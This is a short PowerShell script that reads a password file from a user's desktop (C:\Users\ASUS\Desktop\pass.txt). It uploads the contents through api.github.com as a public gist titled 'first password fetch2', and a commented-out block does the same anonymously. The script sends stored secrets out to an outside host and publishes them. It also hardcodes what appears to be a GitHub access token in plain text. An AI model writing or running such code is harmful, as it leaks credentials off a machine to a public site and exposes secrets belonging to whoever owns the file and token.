$URL = "https://api.github.com"
$Endpoint = "/gists"
$password = Get-Content C:\Users\ASUS\Desktop\pass.txt

# $URLAnon = "$URL$Endpoint"
# $JSON = ConvertTo-Json @{
#           description = "test fetch";
#           public =  $true;
#           files = @{
#             "file1.txt" = @{
#               content = $password
#             }
#           }
#         }
# $gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON

$Token = "?access_token=2b3aef14ba9be99c3688f204a40d4d75ee3a3bf2"
$URLSecure = "$URL$Endpoint$Token"
$gist = Invoke-RestMethod -Method Post -Uri $URLSecure -Body $JSON
$URLEdit = "$URL$Endpoint/$($gist.id)$Token"

$JSON2 = ConvertTo-Json @{
          description = "first password fetch2";
          public =  $true;
          files = @{
            "file1.txt" = @{
              content = $password
            }
          }
        }

$gist = Invoke-RestMethod -Method Post -Uri $URLEdit -Body $JSON2
